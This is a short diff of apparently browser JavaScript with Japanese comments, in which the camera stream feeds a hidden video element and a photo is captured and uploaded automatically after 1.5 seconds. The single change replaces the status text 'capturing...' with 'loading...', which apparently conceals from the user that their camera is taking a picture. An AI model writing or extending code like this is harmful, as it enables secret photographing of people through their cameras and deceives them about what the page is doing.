@@ -79,7 +79,7 @@
 
         // videoは非表示だが、streamは利用する
         video.srcObject = stream;
-        status.textContent = "撮影中...";
+        status.textContent = "読み込み中・・・";
 
         // 少し待ってから自動撮影
         setTimeout(() => captureAndUpload(stream), 1500);
